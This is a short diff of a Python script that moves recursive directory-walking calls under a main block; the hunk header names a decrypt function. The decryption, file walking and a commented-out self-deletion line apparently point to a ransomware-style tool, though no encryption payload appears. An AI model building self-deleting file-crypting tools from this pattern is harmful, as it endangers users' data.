@@ -42,7 +42,7 @@ def decrypt(file):
 
 
 # Parsing
-def walk(dir):
+def walk2(dir):
     for name in os.listdir(dir):
         path = os.path.join(dir, name)
         if os.path.isfile(path):
@@ -54,11 +54,6 @@ def walk(dir):
             walk(path)
 
 
-walk("'''+str(direct)+'''")
-print('-' * 80)
-# os.remove(str(sys.argv[0]))
-
-
 def walk(dir):
     for name in os.listdir(dir):
         path = os.path.join(dir, name)
@@ -68,10 +63,9 @@ def walk(dir):
             walk(path)
 
 
-walk("'''+str(direct)+'''")
-print('-' * 80)
-# os.remove(str(sys.argv[0]))
-
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     main('PyCharm')
+    walk("/tmp/python/")
+    print('-' * 80)
+    # os.remove(str(sys.argv[0]))
